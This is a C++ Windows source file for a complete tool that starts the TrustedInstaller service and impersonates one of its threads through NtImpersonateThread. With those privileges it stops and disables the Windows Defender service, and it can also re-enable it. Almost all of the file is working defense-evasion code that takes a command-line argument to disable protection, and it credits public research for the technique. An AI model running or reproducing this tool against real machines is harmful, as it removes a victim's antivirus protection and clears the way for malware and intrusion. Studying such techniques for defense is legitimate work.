//Disable Windows Defender service 
//https://twitter.com/splinter_code/status/1483815103279603714?s=20
//https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html


#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

typedef NTSTATUS(NTAPI* _NtImpersonateThread)(HANDLE ThreadHandle, HANDLE ThreadToImpersonate, PSECURITY_QUALITY_OF_SERVICE sQS);

BOOL CheckTrustedInstaller() {
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS ss;

    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == NULL) {
        wprintf(L"Error[OpenSCManager]: %d\n", GetLastError());
        return FALSE;
    }
    service = OpenService(scm, L"TrustedInstaller", GENERIC_EXECUTE|GENERIC_READ);
    if (service == NULL) {
        wprintf(L"Error[OpenService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        return FALSE;
    }   
    if (!QueryServiceStatus(service, &ss)) {
        wprintf(L"Error[QueryServiceStatus]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        return FALSE;
    }
    if (ss.dwCurrentState == SERVICE_RUNNING) {
        wprintf(L"TrustedInstaller service is running!\n");
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        return TRUE;
    }
    wprintf(L"TrustedInstaller service is not running!Starting it ...\n");
    if (!StartService(service, NULL, NULL)) {
        wprintf(L"Error[StartService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        return FALSE;
    }
    wprintf(L"TrustedInstaller service started!\n");
    CloseServiceHandle(scm);
    CloseServiceHandle(service);
    return TRUE;
}
void StopDefender() {
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS ss;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == NULL) {
        wprintf(L"Error[OpenSCManager]: %d\n", GetLastError());
        exit(0);
    }
    service = OpenService(scm, L"windefend", SC_MANAGER_ALL_ACCESS);
    if (service == NULL) {
        wprintf(L"Error[OpenService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        exit(0);
    }
   
    wprintf(L"Attempting to stop Defender sevice!\n");
    if (!ControlService(service, SERVICE_CONTROL_STOP, &ss)) {
        wprintf(L"Error[OpenService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        exit(0);
    }
    wprintf(L"Defender stopped!\n");
    if (!ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
        wprintf(L"Error[ChangeServiceConfig]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        exit(0);
    }
    wprintf(L"Defender disabled!\n");
    CloseServiceHandle(scm);
    CloseServiceHandle(service);
}



void EnableDefender() {
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS ss;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == NULL) {
        wprintf(L"Error[OpenSCManager]: %d\n", GetLastError());
        exit(0);
    }
    service = OpenService(scm, L"windefend", SC_MANAGER_ALL_ACCESS);
    if (service == NULL) {
        wprintf(L"Error[OpenService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        exit(0);
    }
    if (!ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
        wprintf(L"Error[ChangeServiceConfig]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        exit(0);
    }
    wprintf(L"Defender service enabled!\n");
    if (!StartService(service, NULL, NULL)) {
        wprintf(L"Error[StartService]: %d\n", GetLastError());
        CloseServiceHandle(scm);
        CloseServiceHandle(service);
        exit(0);
    }
    wprintf(L"Defender started!\n");
    CloseServiceHandle(scm);
    CloseServiceHandle(service);
}

void Impersonate(wchar_t* action) {
    HANDLE hSnap;
    HANDLE hSnap2;
    HANDLE hThread;
    PROCESSENTRY32 process;
    THREADENTRY32 thread;
    SECURITY_QUALITY_OF_SERVICE sQS = { 0 };
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == NULL) {
        wprintf(L"Error[GetModuleHandleW]: %d\n", GetLastError());
        exit(0);
    }
    _NtImpersonateThread NtImpersonateThread = (_NtImpersonateThread)GetProcAddress(ntdll,"NtImpersonateThread");
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Error [CreateToolhelp32Snapshot] :%d\n", GetLastError());
        exit(0);
    }
    hSnap2 = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Error [CreateToolhelp32Snapshot2] :%d\n", GetLastError());
        exit(0);
    }
    process.dwSize = sizeof(PROCESSENTRY32);
    Process32First(hSnap, &process);
    do {

        if (wcscmp(L"TrustedInstaller.exe", process.szExeFile) == 0) {
            wprintf(L"TrustedInstaller process found: %d\n", process.th32ProcessID);
            thread.dwSize = sizeof(THREADENTRY32);
            Thread32First(hSnap2, &thread);
            do {
                if (thread.th32OwnerProcessID == process.th32ProcessID) {
                    wprintf(L"Thread id: %d\n", thread.th32ThreadID);
                    hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, thread.th32ThreadID);
                    if (hThread == NULL) {
                        exit(0);
                    }
                    wprintf(L"Thread handle : %p\n", hThread);
                    sQS.Length = sizeof(sQS);
                    sQS.ImpersonationLevel = SecurityImpersonation;
                    sQS.EffectiveOnly = FALSE;
                    sQS.ContextTrackingMode = SECURITY_STATIC_TRACKING;
                    if (NtImpersonateThread(GetCurrentThread(), hThread, &sQS) == 0) {
                        wprintf(L"Thread Impersonated!\n");
                        if (wcscmp(action, L"Enable") == 0) {
                            EnableDefender();
                            break;
                        }
                        else
                        {
                            StopDefender();
                            break;
                        }
                    }
                }

            } while (Thread32Next(hSnap2, &thread));
            break;
        }
        

    } while (Process32Next(hSnap, &process));

   
}
int wmain(int argc,wchar_t* argv[])
{
    if (wcscmp(argv[1], L"Enable") == 0 || wcscmp(argv[1], L"Disable") == 0) {
        if (CheckTrustedInstaller()) {
            Impersonate(argv[1]);
        }
    }
    else {
        wprintf(L"Usage: %ws <Disable|Enable>\n",argv[0]);
    }
}
